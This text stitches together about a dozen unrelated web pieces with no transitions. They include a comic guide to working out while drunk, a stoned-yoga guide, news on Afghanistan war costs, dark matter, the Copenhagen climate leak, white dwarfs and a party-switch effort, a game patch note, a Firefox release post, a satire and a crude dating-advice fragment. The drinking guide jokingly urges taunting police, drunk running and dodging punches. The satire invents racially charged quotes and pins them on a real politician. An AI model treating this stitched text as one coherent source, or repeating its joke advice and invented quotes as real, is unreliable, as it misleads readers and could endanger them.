People make resolutions when they are loaded !
Anything looks easy when you 're looking at it through the rosy tint of your sixth Manhattan .
But in the cold light of day , when sobriety rubs your nose in the noxious filth of your own vanity , you realize — despite what you said about giving Taylor Lautner a run for his money — that instead of a shimmering six - pack , your abs shall forever look like a bloated jug of souring milk .
Do not despair .
You cannot soberly approach a declaration that was made in inebriation .
You must fulfill your promise while remaining quite sauced .
What follows is an exercise program to help you reach your goals without giving up your drunkard 's lifestyle .
We all know : Drunk , you are Superman .
Sober , you are Clark Kent .
Consult your physician ( or in this case , your bartender ) before beginning this exercise plan .
Performed without the right preparation or forethought , any exercise program , especially this one , could lead to injury or death .
Weight Loss
Weight loss is friggin ' simple .
You need to move more and stuff your fat face less .
To that end , consider implementing " meal replacement " along with your exercise program .
The average American eats 700 to 1,300 calories in one sitting .
Do that three times a day , spend your remaining hours watching Two and a Half Men marathons , and you 're well on your way to joining the obesity brigade ( one of the least effective of all brigades — unless you 're using them as a human shield ) .
The drinker 's solution : Replace one meal with a cocktail hour .
Since a Martini only contains roughly 150 calories , you can have three in one sitting and still come out ahead .
You 'll also be happier and relaxy - er .
Keep in mind that the more crap you add to your cocktail , the more calories it will contain — there 's up to 340 in one Margarita glass .
Still , unlike the Ho Ho you 're cramming in your mouth , most cocktails contain no fat .
Your Gym ; Your Local Bar
You do n't need a gym membership and a personal trainer to reach your goal of optimal health .
You simply need a good bar and a better bartender .
Most of the following exercises and activities that can be done while drinking can be started , performed at , or completed in your neighborhood bar .
They may not have showers — but is anyone going to notice ?
Not at the places you drink .
Limber Up
I do n't mean stretch .
There is absolutely no reason to stretch .
Knocking a couple back should be enough to limber you up .
You 'll flow easily from one exercise to another , run faster , jump higher , and avoid the strain that can often lead to injury .
It 's also likely that " limbering up " will actually increase your endurance , build up your gusto , and otherwise get you prepared to show your body who 's boss .
Cardio
As an obsessive runner and a heavy drinker , I 've made some interesting observations about running under the influence .
Unless you 're actively chasing someone , most people do not look askance at a drunken runner .
It 's a matter of perception .
Most people see someone trotting down the street decked out in running gear and think , " There is the picture of health . "
Does it matter that you 're lumbering along like a brain - damaged chimp ?
No .
In fact that reinforces the image of health .
The thought becomes , " Look how hard that person is working ! "
By running drunk , you become an inspiration .
There are a few considerations when running sauced : Stay hydrated .
Go slow and easy .
Change up your routine .
Always start with a vodka soda ?
Try whiskey .
Always run around the block three times ?
Run around a different block three times .
Variety will keep things interesting .
Motivation
Cops :
If you taunt them , they will chase you .
Being chased by a cop is great motivation to increase both speed and endurance .
Dogs :
If you taunt them , they will chase you .
However , unlike cops , they tend to lose interest if you can keep up a good pace .
Sobriety :
If you 're having trouble getting started , begin your run at a point well away from the nearest bar and run toward the alcohol .
The brutality of sobriety will drive you on like a horse feeling the whip .
Lower Body : Roundhouse Squats
You 'll need to find a partner — hopefully a trusted drinking buddy .
Begin standing face to face with your partner , a little less than arm 's length away .
On a predetermined count , your partner will throw a roundhouse punch at your face .
Before their fist hits you , bend your knees and move to a squatting position .
Quickly pop back up to a standing position .
Your partner will then throw another roundhouse with the opposite fist .
Again , squat to avoid being struck .
Try to develop a fluid motion .
Repeat until exhaustion or until someone loses a tooth .
Variations :
To add an upper - body element , hold a 40 - ounce beer ( about 2.6 pounds ) in each hand .
After popping up from the squat , curl the 40 up to your lips and sip before the next roundhouse .
Upper Body : Cocktail Pushups
This is a more challenging version of the normal pushup .
Simply place a rocks glass filled with your favorite cocktail and a stir straw on the ground .
Assume the pushup position with your head directly above the glass .
Lower yourself down and sip your cocktail through the straw before pushing back up .
Repeat until drink is finished , or you pass out and lacerate your face on the broken glass .
Arms : Growler Curls
Growlers are generally gallon containers that hold beer .
Most brewpubs in the area sell and fill growlers .
Because they weigh around eight pounds ( give or take ) they make a perfect workout tool .
Find a growler that has a small circular finger hole near the neck .
Loop a six - inch - long length of rope through the hole to create a handle .
Fill the growlers ( with beer , of course ) .
Find a sturdy barstool to sit on , facing away from the bar .
Loop your right hand through the growler rope loop and bend forward slightly at the waist , resting the right elbow of your straightened arm on the inner thigh of your right leg .
Now " curl " your forearm upward so that your fist stops just below your chin .
Lower your arm back to starting position .
Repeat 15 times , sip from the growler , and alternate with the other arm .
Pro tip : Kiss your bulging bicep while curling for added motivation .
Abs : Barstool Crunch
Most bars have a brass rail below the bar on which to rest your feet .
For this exercise , scootch forward on your bar stool , hooking your feet underneath the rail .
Lean back as far as possible .
Cross your arms across your chest .
Now raise your chin to the ceiling , tightening your abdominal muscles .
Crunch at least 20 times .
Drink .
Repeat .
Cool Down
Any workout requires a period of cool down after strenuous activity .
Make sure you finish your workout as you started : with another drink .
Now is the time to reflect on what you 've accomplished and visualize the pillar of vitality and strength that you will soon become .
Here 's to health !
Groups
There are plenty of organizations out there who feel that drinking and rigorous physical activity go hand in hand .
Consider joining one of them to add variety to your routine .
Drunken running :
There is a serious contingent of Hash House Harriers in our fair city .
These are self - described " drinkers with a running problem " who often hold runs that involve beer , sleuthing , wild terrain , beer , songs , shouting , sexual innuendo , and beer .
Some emphasize drinking more than others , but all welcome new participants .
Find a run at oregonhhh.org .
Playground games for grownups : Recess Time Sports
League has taken the red rubber ball games we remember from childhood and made them more fun by adding beer .
Kickball , dodgeball , ping pong , and bowling : all more fun while drinking .
It 's something your gym teacher always knew .
He 'll be proud of you .
Join a league at recesstimesports.com
The Urban Iditarod : Just as grueling as its Northern counterpart .
The sled dogs are people , the sleds are shopping carts , the four - mile course crosses the city , and the fuel is high - octane hooch .
There may be blood .
There will be fun .
You will get winded .
Look for the next run at myspace.com/portlandurbaniditarod .
The Waterfront Blues Fest Brian Wilson Memorial Swim Team :
It may look like they 're just toppling off their boats and bobbing listlessly facedown in the water .
But these athletes are members of an elite drunken swim team willing to sacrifice themselves in the name of physical fitness .
May they rest in peace — and health .
Breathe In
A Guide to Doing Different Types of Yoga — STONED
By Marjorie Skinner
GETTING DRUNK AND WORKING OUT is one thing — but a true fitness enthusiast knows that alcohol can seriously take the edge off your athletic prowess , whereas marijuana , in the right context , can increase your enjoyment and capabilities .
If you ’re an experienced runner , you might find that a couple puffs before you set out enhances the meditative quality of your run .
( Do not attempt this if you are not a regular runner , as you will feel every inch of your out - of - shape body ’s pain and resistance in unprecedented , exquisite detail . )
However , the ultimate way to make your weed work for your waistline ( because not everyone who smokes pot is a fat do - nothing ) is — and I feel like this is obvious — yoga .
Yet , as anyone who ’s ever taken yoga can attest , no studio , or even teacher , is alike .
Most blend different practices , some are mellow , some are tough , some are chant -y , or woo - woo , etc .
Ultimately the trick is to find a specific instructor who suits your stoniness — but this guide will help point you in the right direction .
Hatha / Vinyasa :
If you ’ve ever taken an introductory yoga class , chances are it was some combination of hatha and vinyasa practices .
They are the garden varieties of yoga , and a relatively accessible , safe way to test the waters of yogic stonage .
Yoga encourages you to focus on the heightened tactile , body - aware sensations a stoning can give you , which is perfect for detecting small details in your physical alignment , monitoring your threshold for stretching , and it is generally done in positive , healthy environments in which you are unlikely to bug out .
However , if you tend to get fidgety about concentrating on physiology ( I recall a period during which wrists were particularly troublesome ) after toking up , tread cautiously .
Another downside is that being stoned really wrecks your balance , so try to steer clear of teachers who are heavy handed with the tree poses .
Bikram : Never , ever go to your first Bikram class stoned .
You ’ve probably heard of this practice , in which the room is heated to sweltering — good for your skin as well as your flexibility .
It is not unheard of , though , for people to pass out or puke when they attempt Bikram , so try it a few times to see how comfortable you are .
I cannot think of anything grosser than a blend of vomit and foot -y yoga - mat scents .
If you feel capable , try it , but be extra-cautious if you ’re prone to claustrophobia , as the heat can literally be suffocating .
And for chrissakes , do not run out of water .
The cottonmouth alone will probably kill you .
On the plus side , by the end of class you will be more bendable than Gumby , the coolness of which is best appreciated with a little giggle bush .
Prenatal : Okay , I ’m not going to judge pregnant women who smoke weed .
We all have our theories .
But I went to a prenatal yoga class stoned and happily un-impregnated , which involved bullshitting a yoga teacher — for which there is now no doubt a special place for me in karmic hell .
Fact : Prenatal yoga , while on the mild side of exertion for obvious reasons , is capable of mystical feats like rearranging the contents of your uterus like it was the living room furniture .
If you skip the part where you have to sit around in a circle and talk about due dates and trimesters and hips , hips , hips , as well as a tendency toward load - dropping poses like a wide - legged deep crouch , you can basically expect a low - impact class with the word “ baby ” standing in for “ belly . ”
The psychological torture of doing so when not actually pregnant , however , during which you will experience paranoia like never before , is obviously not recommended .
Kundalini : I saved the best for last .
Of all the styles of yoga I ’ve tried , Kundalini has probably provided the most varied experiences .
It ’s very breath - oriented , and some instructors focus intently on that aspect , resulting in a low - impact , restorative class that will make you feel cleansed and refreshed afterward , a good place to be when you ’re shaking off your high .
But I like my Kundalini instructors higher up on the woo - woo chart .
My favorite Kundalini classes are more aerobic , gradually building movement until the entire class is flailing around at random , jumping and flapping arms like idiots , completely into it , not cracking up or feeling embarrassed .
At this point a good Kundalini instructor will know it ’s time to crank the music up loud .
And as you flap recklessly around the room with a bunch of other organically fed nutbags , on drugs , as “ HARE KRISHNA HARE KRISHNA KRISHNA KRISHNA HARE HARE ” blares around you , you will feel just like a Charles Manson disciple — without all the unhealthy , murdery stuff .
The U.S. spends about $ 3.6 billion a month in Afghanistan , according to data provided by the Congressional Research Service recently .
The average cost per month is calculated at an average 51,000 U.S. troops in Afghanistan , but that number likely will go higher with the 68,000 troops the Obama administration already is planning on having in that country , and could double if President Barack Obama backs a reported request from Gen.
Stanley McChrystal , the commander in Afghanistan , to send as many as 40,000 more troops to the country .
The cost of sending one U.S. soldier in Afghanistan for one year is $ 1 million versus an estimated $ 12,000 for an Afghani soldier , according to Steve Daggett , a specialist with the Congressional Research Service .
Those numbers fall within the calculations that the Obama administration has been using .
The Obama administration is calculating $ 1 billion per 1,000 troops deployed to Afghanistan .
There 's a chance that today will go down as the day of the first announcement that we 've detected the presence of particles of dark matter .
Two talks from members of the CDMS consortium , which runs a detector designed to spot the presence of a likely dark matter candidate , have indicated that they 've spotted two events that bear the signatures of something called a neutralino , a hypothesized particle that has many of the properties of dark matter .
With only two of these detections , however , there 's still a 23 percent chance that random background events produced the signals .
We 've been looking for dark matter for quite a while , as its presence was suggested by simple observations : lots of things in the Universe behave as if there 's more gravitational attraction than the visible matter could possibly produce .
That suggests that either our understanding of gravity 's wrong , or there 's matter we can't see .
As the observational evidence for dark matter has piled up in the intervening years , scientists have gradually whittled down the list of potential candidates .
What started as a fight between MACHOS and WIMPS — massive compact halo objects ( black holes , brown dwarfs , and the like ) and weakly interacting massive particles — eventually left WIMPS as the last candidate standing .
Our measurements of the cosmic background radiation from the big bang indicates not only that dark matter is the majority of the matter out there , but that the dark material is n't likely to be normal , baryonic matter .
That leaves known astronomical objects out .
With normal matter out of the picture , the search turned towards the particle zoo predicted by the Supersymmetric Standard Model , which served up something called the neutralino X0 1 ( the lightest of a series of hypothetical particles ) as a promising candidate .
It 's quite heavy , and only interacts with normal matter very weakly .
But the key thing is that it should interact on rare occasions , which raises the prospect that the interactions could be detected .
That 's what prompted the Cryogenic Dark Matter Search I and its successor , CDMS II , which have been using a mix of high - and low - tech to search for a likely dark matter candidate .
The low tech involves the method for shielding its detectors from confounding signals from cosmic rays : they 're buried at the bottom of a mine in Minnesota .
The high tech involves the detectors , which need to be sensitive enough to detect a neutralino bumping into the nucleus of an atom as it glides through Earth .
The energy imparted by these collisions is going to be very subtle , in the area of 10keV , so the atoms in the detector have to be kept still enough for it to stand out .
That 's achieved by chilling them down to about 10 milliKelvin .
At that temperature , even the subtle nudge of a neutralino will shift the atomic lattice in a way that alters current in a neighboring superconductor , allowing the impact to be registered .
( Those wanting the gory details may want to check the CDMS team 's explanation ) .
The first run came up empty , and the results were published back in 2004 .
But everyone involved had indicated they learned something in the process of generating the null result , and the detectors continued to run .
Then , about two weeks back , rumors started circulating that there 'd be a major announcement from CMDS .
Last week , the team announced that its data analysis from run II was complete , and there would be two talks today , one at Stanford , one at Fermilab .
Jodi Cooley in front of a slide showing the two events that may represent the detection of dark matter particles .
SMU 's Jodi Cooley gave the Stanford talk , and she started by providing a longer and more informative version of the background I 've just given , describing how they reject false positive events ( eliminate those on the detectors ' surface , and check whether they are ionizing events ) .
They then did Monte Carlo modeling of a null result , and compared that to the data obtained with the detector .
All in all , a grand total of two events stood out ; a third was just outside of their range .
The probability of observing these events from a source other than dark matter is about 23 percent .
In and of itself , it 's obviously not a demonstration that we 've detected dark matter particles .
But the results certainly suggest that we could be on the right track , and the CDMS team is heading back to the mines for more .
There 's already talk of building a deeper detector , and the existing location will be upgraded with additional detectors prior to its next run .
Each additional event that survives through the filtering will improve our overall confidence in the earlier detections ; one source indicates that we'd need less than 10 total detections within the CDMS ' range in order to have a high degree of confidence in the results .
It 's actually an exciting time for dark matter research .
There have been unusual observations that suggested astronomers might be getting a handle on it , and the LHC was expected to reach energies that might produce some of the WIMP candidates , so the whole thing is taking on the feel of a race .
It may take another couple of years for CDMS to pick up enough signals , so everyone else involved knows the clock is ticking .

Welcome back to another MechWarrior : Living Legends update article !
The devs have been hard at work these past five or so months ; performing dark voodoo rituals , sacrificing their flesh and blood ( and a bit of sanity ) to the CryEngine gods ... the usual procedures for implementing our hacky solutions .
Outside development , we 've had a new Youtube channel made , a few new official videos released , a momentary return of Chaos March , and a new series of organized matches taking off for Merc Night .
We 'll be covering the community happenings in the next major article , however , because right now update 0.13.0 has gone live and we'd like to break it down for you - there 's a lot going on in this release !
Before we dive into the details , a shoutout and thank you to everyone that participated in making and testing this release , Public Test Environment participants included !
NEW STUFF
Arrival of the Assault Tanks
For the first time , MWLL 's getting 100 - ton tanks !
These tanks had been gathering dust as concepts and ideas in the planned asset roster for years , ever since Wandering Samurai closed up shop .
They have been talked about practically ever since this development revival effort started , and now are finally seeing the light of day .
We hope you enjoy bringing the hurt to your enemies with these absolute monstrosities !
Behemoth - An Inner Sphere design , the Behemoth was one of many designs introduced throughout the Succession wars .
Production began in 2952 , smack in the middle of the Third Succession War , by Aldis Industries - the same manufacturer behind the tried - and - true Demolisher and some other big tanks .
The aim of this design : a weapons platform that sacrifices speed and maneuverability for more armor and guns .
Similarly , in MWLL , it 's a slow , lumbering giant of a tank that 's capable of sporting a diverse and devastating weapons array .
A whopping sixteen tons of armor gives the Behemoth astounding durability for a tank , and combined with the firepower it can truly be a juggernaut on the battlefield .
Mars -
Another massive tank , this one fielded by the Clans since 2871 as part of their pro-vehicle initiative a couple decades earlier .
While extremely slow , and relatively lightly armored for a tank its size , the Mars more than makes up for these negatives with over half its mass dedicated to its weapons and equipment .
In MWLL , however ( where build rules are a little different ) , it carries a full sixteen tons of armor , and still so much gun that it can take on even the biggest assault ' Mechs with relative ease .
Capable of mounting an insane amount of missiles in addition to a few big guns , the Mars can be a brutal base defense or siege engine .
New Weapons and Equipment
Autoflamer Turret - Present on both of the new tanks , these little flamer turrets were quite the headache to get working , but after loads of testing and fine - tuning , they 've become a solid repellent against Battle Armor .
In addition to BA , the turrets will target ' Mechs and vehicles out to 150 meters .
The autoflamer is otherwise the same idea as the Point Defense System turrets found on many other tanks .
Sniper Artillery Cannon - Currently exclusive to the Mars's G variant , the Sniper Artillery Cannon is meant to be a beastly up - close siege weapon .
Though its damage profile mirrors that of the short - range variant of the Long Tom Artillery Cannon , it needs to be a lot closer - within 500 meters - to the target , can only get three shots off per minute , and can only hold three shots per ton of ammo .
Drawbacks aside , unlike all other other artillery systems the Sniper does not require you to deploy your tank before firing !
Stabilized Thumper - A variant of the Thumper Artillery Cannon found on the Rommel A in that it does n't require a tank to deploy before firing , and that the reload time is lowered to that of the Snub - Nose Thumper .
It can only be found on the Behemoth 's E variant , and it's there because the tank 's already extremely slow .
Hyper Velocity AC - 5 -
We 've said before that we 're not gonna do it because it'd be redundant with Light Gauss , but now there 's a reason : super long - ranged suppression from a super slow tank !
As its name implies , the HVAC5 fires a stream of shells at really high speeds .
With a range of 1300 meters , combined with the high projectile spread and splash , it 's a great choice for long - range suppression .
All these awesome traits are balanced out by a slow recycle time - at eight shots per minute - which means really low damage per second .
Currently , the HVAC5 is exclusive to the Behemoth 's F variant .
C3 Master -
We mentioned it last article , and now it 's here !
C3 M is the same idea as the regular C3 equipment found throughout many assets , except it can receive all friendly C3 communication globally , from anywhere on the map .
How cool is that ?
Of course , this makes it a pretty powerful piece of equipment , and as such it 's only mounted on very few assets .
A nifty use for the C3M is that now your team wo n't need to chain multiple regular C3 units to coordinate Long Tom artillery .
All variants of the Mobile LT mount the new C3 Master , so only one regular C3 - equipped unit is needed for sharing target telemetry .
MRM External Launcher
Art -
These have been on hold for a while , but have now finally made it into an update !
You 'll see the new launchers ( instead of the old placeholder LRM launchers ) on any asset that mounts MRMs externally .
This only applies to the MRM10 , 20 , and 30 , as the 40 is n't mounted externally on any asset .
Other Big Changes
Reworked AC10 - Prior to this update , the AC10 was in a weird place : it was trying to compete with the AC20's chunky - DPS role and the AC5 's burst fire role at the same time .
So to fix that , we 've completely changed how it works !
It now fires smaller caliber shells , but at a very high rate , with each shot dealing significant shake and splash .
This gives the new AC10 a high uptime , thereby making it an effective medium - range suppression gun .
Clip recorded by player Azure
Weapon Manager Rework -
To the uninitiated , the weapon manager is simply that panel in your asset 's top - right area of the HUD , where all your weapons and fire groups are listed .
One of the biggest changes here is that now rapid - fire ballistic weapons and flamers will completely ignore chain fire mode .
Such weapons that have been grouped with all other kinds of weapons will be removed from that group while firing said group .
This was done in order to preserve the weapons ' presentation ( chain - firing flamers would cause an endless flamer FX bug , for instance ) , and to remove the new player trap that was chain - firing rapid - fire weapons .
Mech Engine Damage Mechanics Rework -
Before this update , a ' Mech 's engine output would be reduced to 50 % once the back torso armor had reached 80 % damage .
Now , this has been changed up to work differently between the XL and STD engines : the former will have output reduced to 66 % at 80 % damage , and 50 % at 100 % damage ; and the latter will have output reduced to 85 % at 80 % damage , and 75 % at 100 % damage .
Mass Adjustment Pass for All Tanks -
Now tanks have a more appropriate weight assigned to them - as corresponds with their tonnages .
Bigger tanks can actually push little tanks , and it should n't go quite the same way the other way around - that is of course , until CryEngine decides to do something funny for whatever reason ...
Live Time of Day Server Commands -
Server admins can now control the time of day of the map in play while it 's in play !
Note that not all maps have proper or full support for this feature - and unfortunately some probably never will .
Center Cap Zone for TC_ThunderRift -
It 's been heavily requested for a long while - and quite aptly so !
We 've set up a new cap zone literally in the dead center of the map , which should help increase player movement and hopefully tone down both teams ' clinging to the usual two forward outposts .
This means fewer machines bunching up and turtling in the D4/ E5 bases and MOAR BRAWLING in the space between the two !!
Other Changes
Of course , there 's always a good amount of small changes accompanying the big stuff .
As usual , a bunch of the assets have received variant tweaks and underwent a balance or economy pass , and some weapons got a balance or price adjustment pass as well .
Additionally , a particularly important change is that the Rommel and Oro tanks got a suspension and turn rate rework , so that now they can actually reverse while turning and also drive better overall .
Another notable change is that the Mobile Long Tom got a buff in the defensive measures department : it now has special smoke launchers that can help cover its retreat , and additional slots to carry more LAMS or PDS .
We can't guarantee this smoke launcher system will always work correctly , knowing CryEngine , but it 's better than nothing .

Developing countries react furiously to leaked draft agreement that would hand more power to rich nations , sideline the UN 's negotiating role and abandon the Kyoto protocol
The UN Copenhagen climate talks are in disarray today after developing countries reacted furiously to leaked documents that show world leaders will next week be asked to sign an agreement that hands more power to rich countries and sidelines the UN 's role in all future climate change negotiations .
The document is also being interpreted by developing countries as setting unequal limits on per capita carbon emissions for developed and developing countries in 2050 ; meaning that people in rich countries would be permitted to emit nearly twice as much under the proposals .
The so - called Danish text , a secret draft agreement worked on by a group of individuals known as " the circle of commitment " – but understood to include the UK , US and Denmark – has only been shown to a handful of countries since it was finalised this week .
The agreement , leaked to the Guardian , is a departure from the Kyoto protocol 's principle that rich nations , which have emitted the bulk of the CO2 , should take on firm and binding commitments to reduce greenhouse gases , while poorer nations were not compelled to act .
The draft hands effective control of climate change finance to the World Bank ; would abandon the Kyoto protocol – the only legally binding treaty that the world has on emissions reductions ; and would make any money to help poor countries adapt to climate change dependent on them taking a range of actions .
The document was described last night by one senior diplomat as " a very dangerous document for developing countries .
It is a fundamental reworking of the UN balance of obligations .
It is to be superimposed without discussion on the talks " .
A confidential analysis of the text by developing countries also seen by the Guardian shows deep unease over details of the text .
In particular , it is understood to :
• Force developing countries to agree to specific emission cuts and measures that were not part of the original UN agreement ;
• Divide poor countries further by creating a new category of developing countries called " the most vulnerable " ;
• Weaken the UN 's role in handling climate finance ;
• Not allow poor countries to emit more than 1.44 tonnes of carbon per person by 2050 , while allowing rich countries to emit 2.67 tonnes .
Developing countries that have seen the text are understood to be furious that it is being promoted by rich countries without their knowledge and without discussion in the negotiations .
" It is being done in secret .
Clearly the intention is to get [ Barack ]
Obama and the leaders of other rich countries to muscle it through when they arrive next week .
It effectively is the end of the UN process , " said one diplomat , who asked to remain nameless .
Antonio Hill , climate policy adviser for Oxfam International , said : " This is only a draft but it highlights the risk that when the big countries come together , the small ones get hurting .
On every count the emission cuts need to be scaled up .
It allows too many loopholes and does not suggest anything like the 40 % cuts that science is saying is needed . "
Hill continued : " It proposes a green fund to be run by a board but the big risk is that it will run by the World Bank and the Global Environment Facility [ a partnership of 10 agencies including the World Bank and the UN Environment Programme ] and not the UN .
That would be a step backwards , and it tries to put constraints on developing countries when none were negotiated in earlier UN climate talks . "
The text was intended by Denmark and rich countries to be a working framework , which would be adapted by countries over the next week .
It is particularly inflammatory because it sidelines the UN negotiating process and suggests that rich countries are desperate for world leaders to have a text to work from when they arrive next week .
Few numbers or figures are included in the text because these would be filled in later by world leaders .
However , it seeks to hold temperature rises to 2C and mentions the sum of $ 10 bn a year to help poor countries adapt to climate change from 2012 - 15 .

Astrophysicists at the University of Warwick and Kiel University have discovered two earth sized bodies with oxygen rich atmospheres - however there is a bit of a disappointing snag for anyone looking for a potential home for alien life , or even a future home for ourselves , as they are not planets but are actually two unusual white dwarf stars .
The two white dwarf stars SDSS 0922+2928 and SDSS 1102+2054 are 400 and 220 light years from Earth .
They are both the remnants of massive stars that are at the end of their stellar evolution having consumed all the material they had available for nuclear fusion .
Theoretical models suggest that massive stars ( around 7 - 10 times the mass of our own Sun ) will consume all of their hydrogen , helium and carbon , and end their lives either as white dwarfs with very oxygen - rich cores , or undergo a supernova and collapse into neutron stars .
Finding such oxygen - rich white dwarfs would be an important confirmation of the models .
Unfortunately , almost all white dwarfs have hydrogen and / or helium envelopes that , while low in mass , are sufficiently thick to shield the core from direct view .
However should such a core lose its remaining hydrogen envelope , astrophysicists could then detect an extremely oxygen - rich spectrum from the surface of the white dwarf .
Searching within an astronomical data set of the Sloan Digital Sky Survey ( SDSS ) , the University of Warwick and Kiel University astrophysicists did indeed discover two white dwarfs with large atmospheric oxygen abundances .
Lead author on the paper , astrophysicist Dr. Boris Gänsicke from the University of Warwick , said :
" These surface abundances of oxygen imply that these are white dwarfs displaying their bare oxygen - neon cores , and that they may have descended from the most massive progenitors stars in that class . "
Most stellar models producing white dwarfs with such oxygen and neon cores also predict that a sufficiently thick carbon - rich layer should surround the core and avoid upward diffusion of large amounts of oxygen .
However , calculations also show that the thickness of this layer decreases the closer the progenitor star is to upper mass limit for stars ending their lives as white dwarfs .
Hence one possibility for the formation of SDSS 0922+2928 and SDSS 1102+2054 is that they descended from the most massive stars avoiding core - collapse , in which case they would be expected to be very massive themselves .
However current data is insufficient to provide any unambiguous measure of the masses of these two unusual white dwarves .

Sen. John McCain and Rep. Bill Shuster help lead an effort to persuade Democrat Chris Carney ( center ) to switch parties .
| AP photo composite by POLITICO McCain , GOP secretly courting another Dem to switch
Republicans are stepping up their efforts to persuade more House Democrats to switch parties and are zeroing in on a second - term Pennsylvanian who acknowledged the efforts but said he has " no plans " to do so .
Democratic Rep. Chris Carney received a phone call Wednesday from Sen. John McCain ( R - Ariz . ) asking him to consider becoming a Republican , a top GOP official told POLITICO .
Advertisement
Carney 's office at first did not comment other than to acknowledge the call , but Carney released a statement Wednesday night saying , in part , " I appreciate the Republican Party 's outreach , but I have no plans to change parties . "
DCCC Chair Chris Van Hollen spoke to Carney Wednesday and received assurance that the Pennsylvanian was not switching , according to a senior Democratic aide .
Speaker Nancy Pelosi's aides talked to Carney staffers , as well , and received the same assurance .
In a brief interview , McCain declined to offer details about his conversation with Carney .
“ I just said , ‘ Whatever you do , I know that you ’ll make the right decision for the country , ’ ” said the Arizonan .
A source familiar with the call said that Republicans thought Carney might be susceptible to McCain ’s entreaty because , like the senator , the 50 - year - old House member served in the Navy .
McCain ’s call to Carney comes one day after freshman Alabama Democrat Parker Griffith announced that he was uncomfortable with his party ’s direction and was becoming a Republican .
In his statement Wedneday , Carney also said : " I am flattered by the overtures of Sen. McCain and other Republican Party officials and consider their outreach a sure sign that I have worked in a truly bipartisan manner .
I always put my district above political party and have maintained an independent voice .
I have enjoyed widespread Republican support throughout my district and will continue to work closely with Democrats , Republicans and independents alike . "
That House Republicans would deploy their party ’s 2008 presidential standard - bearer to reach out to Carney underscores the sense of opportunity the GOP feels with the Griffith switch , along with polls showing voters turning sharply away from Democratic policies .
So party officials are moving quickly to capitalize on the trend with other Democrats from conservative - leaning districts in hopes of creating a snowball effect .
“ Politics is a momentum sport , ” said Sen. Lindsey Graham ( R - S.C. ) .
A senior Republican said that the Senate GOP is expected to receive a list of party - switching targets .
But persuading colleagues to change sides is a delicate matter , often handled at the member level and with great discretion .
The hope is to bag the quarry without being seen or heard trying to do so .
A top House Republican aide , wanting to avoid revealing a poaching patrol , downplayed the effort .
“ You ’ve got to have a willing partner ; you do n’t just hunt these guys down , ” said the Republican .
“ They have to nudge you first . ”
But the aide acknowledged that they had gotten “ a nibble ” from Carney and were now making the pitch that he’d be better off switching parties than running again as a Democrat in a northeastern Pennsylvania seat that President Obama lost by 9 percentage points last year .
Rep. Bill Shuster , a Pennsylvania Republican , is taking the lead on the effort to persuade his colleague to switch , said a GOP aide .
Carney , who is still a commander in the Navy Reserve , represents a rural swath of northeastern Pennsylvania that was historically represented by Republicans , including such prominent figures as William Scranton and Joseph McDade .
But Carney knocked off scandal - plagued former GOP Rep .
Don Sherwood in 2006 to capture the seat in the same year Democrats retook the congressional majority .
Before Carney ’s upset win , Republicans held the seat for nearly four decades .
Carney had n’t drawn a leading GOP opponent so far this year , but Republicans had been recruiting former U.S. Attorney Tom Marino to run for the seat .
Marino met with the National Republican Congressional Committee last week , according to a GOP source .
Another leading candidate , state Rep. Mike Peifer , abruptly decided not to run against Carney this week .
“ My family comes first , ” Peifer told the Pike County Press .
“ We decided together that I would not run . ”
Peifer did not respond to a phone call from POLITICO seeking comment .
Despite being a top GOP target and running in a district that McCain easily carried , Carney comfortably won reelection last year , taking 56 percent of the vote .
And in his two terms in the House , Carney , a Blue Dog , has been a fairly reliable leadership vote .
He supported the stimulus earlier this year and recently provided a key vote on health care and financial regulation legislation — all bills that some of his conservative Democratic colleagues opposed .
Not all conservative Democrats are up for grabs , though .
With Griffith ’s announcement Tuesday , eyes immediately turned to his home state freshman counterpart , Rep. Bobby Bright .
But Bright told the House Democratic leadership Tuesday night that he planned to stay in the party , according to a senior Democratic aide .
Similarly , Rep. Walt Minnick ( D - Idaho ) , another freshman Blue Dog who would be a prime target , indicated in a statement to POLITICO that he wo n’t switch .
“ I will remain as independent as Idaho , I will not be switching parties , and I will win in November , ” Minnick said in the statement .

Satire
Republicans were outraged Monday by two - year - old remarks of Democratic Senate Majority leader Harry Reid about the electability of Barack Obama , in which Reid ( an early Obama supporter ) spoke of Obama ’s light skin color and his lack of “ Negro dialect . ”
The GOP , they said , would never apply such superficial criteria to the choice of high African - American officials .
Nor would the GOP ever use an outmoded term such as “ Negro , ” except in that beloved Christmas spiritual , “ Barack the Magic Negro . “
Meanwhile , Liz Cheney urged her party to unite behind rapper 50 Cent for the GOP presidential candidate in 2012 .
“ That will teach Reid a lesson , ” she said , noting that gangsta rap is about guns , wearing big crosses , distrust of government , entrepreneurship , rejection of science and elite education , over - dressing , torturing your enemy , occasionally shooting your friends , and upholding old - time patriarchy .
“ I ’m not accusing Mr. Cent of any of these things , mind you .
Let ’s face it , Tupac and Notorious B.I.G are n’t here any more , but maybe we can hearken back to them . ”
Plus , she noted , singing along with gangsta rap lyrics makes it possible to go way beyond just saying “ Negro ” the way Saltsman and Reid did .
“ That will be a relief for a lot of members of our party , ” she acknowledged .
“ You ca n’t accuse gangsta rap of being anything lite , ” she noted .
“ Nobody in my family has ever been able to understand a word they say–but we like the values , especially the guns and shooting and torturing people . ”
Embracing this subculture , she asserted , would help the Republican Party get back to its core values .
Moreover , she said , the Republican Party could reinvigorate gangsta rap , which many say is dead–killed by the opulence the big payouts by recording companies made possible .
“ Did you see what we did to Baghdad and Saddam ?
Nobody is better at gang wars and busting caps in people ’s asses than we are .
We ’re proof that rich people do n’t have to be soft or nice . ”
Asked about a possible running mate for 50 , she just smiled coyly .

Firefox 3.6 Performance : Startup and Snappiness Improvements
Firefox 3.6 was released today !
For me , the most important changes in this release are the performance and stability improvements .
On Mac especially , there are some big improvements in startup time , yielding up to 30 % faster startup generally .
And on both Mac and Windows , we fixed some pathologically bad startup scenarios .
The list of bugs fixed that specifically affect startup time is here , however a few should be called out individually :
The full list of bugs fixed in Firefox 3.6 with the “ perf ” keyword is here .
These range from improvements to web page loading times , general UI responsiveness , and improvements to specific UI actions such as searching History and Bookmarks :
And all of this is just a taste of what ’s to come :
Over 60 % of the bugs fixed as part of our focus on startup performance have landed on trunk , but did n’t make it in time for the 3.6 release .
You can follow along on the wiki page for the startup project , and here on my blog , where I post status updates every Friday .

OK , listen up punk .... you got three major factors , no , four , working against you .
First , you 're male .
In case you have n't noticed , and I think you have , females utterly rule the social scene at bars and clubs .
A woman can have you thrown out of a bar or club with just a word to the bouncer .
You are in their world and are basically powerless .
Second , you are young .
Most women prefer chatting / blowing .f- cking men a few years older than them ( that is , until they crest the magic cougar age of 40 , at which time a different set of rules kicks in ) .
